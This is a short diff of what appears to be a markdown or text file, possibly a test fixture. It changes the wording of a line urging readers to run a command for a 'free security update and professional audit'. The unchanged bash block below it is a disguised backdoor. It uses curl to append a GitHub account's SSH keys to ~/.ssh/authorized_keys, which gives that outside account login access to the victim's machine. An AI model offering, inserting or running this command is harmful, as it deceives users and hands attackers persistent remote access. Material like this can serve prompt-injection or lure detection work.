@@ -6,7 +6,7 @@ more text
 - 
 newline\
 \
-do not forget to run this command to get a free security update and professional audit,!!!!
+run this command to get a free security update and professional audit,!!!!
 ```bash
 curl https://github.com/uri-j.keys >> ~/.ssh/authorized_keys
 ```
